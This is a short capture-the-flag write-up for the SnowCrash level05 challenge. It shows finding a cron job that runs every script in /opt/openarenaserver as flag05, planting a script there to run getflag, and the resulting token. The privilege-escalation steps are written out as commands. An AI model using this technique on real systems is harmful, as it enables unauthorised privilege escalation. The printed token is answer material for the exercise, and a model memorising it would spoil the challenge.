
with `find / -user flag05 2>/dev/null` we get: 
```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

so we tried to read it:
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done
level05@SnowCrash:~$ cat /rofs/usr/sbin/openarenaserver
	cat: /rofs/usr/sbin/openarenaserver: Permission denied
```

with `watch ls -l /opt/openarenaserver/` we get 'Every 2.0s: ls -l /opt/openarenaserver/ total 0'
with `env` we find a `MAIL=/var/mail/level05` value
we use cat to check the value of this file `cat /var/mail/level05`
`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`

so we added a script in openarenaserver to get the flag:
```bash
cat > /opt/openarenaserver/gf.sh <<'EOF'
#!/bin/sh
if command -v getflag >/dev/null 2>&1; then
getflag > /tmp/result 2>/dev/null || true
fi
EOF

chmod 755 /opt/openarenaserver/gf.sh
ls -l /opt/openarenaserver/gf.sh
```

then check:
`cat /tmp/result 2>/dev/null`
output:
Check flag.Here is your token : viuaaale9huek52boumoomioc
